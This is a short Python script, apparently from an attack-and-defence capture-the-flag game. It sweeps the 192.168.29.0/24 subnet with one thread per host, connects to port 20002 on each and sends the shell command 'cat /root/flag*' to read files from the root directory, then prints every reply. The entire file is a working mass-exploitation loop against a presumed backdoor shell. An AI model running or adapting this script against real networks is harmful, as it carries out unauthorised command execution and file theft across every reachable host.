#!/usr/bin/python

import sys
import threading
import socket


def ncnc(host):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		s.connect((host,20002))
	except Exception as e:
		sys.exit()
	try:
		s.send("cat /root/flag*\n")
		r=s.recv(4096)
		print(host+' '+r)
		s.close()
		sys.exit()
	except Exception as e:
		s.close()
		sys.exit()

if __name__ == '__main__':
	a=1
	while a<=254:
		host='192.168.29.'+str(a)
		if host != '192.168.29.12':
			t=threading.Thread(target=ncnc,args=(host,))
			t.start()
		a=a+1
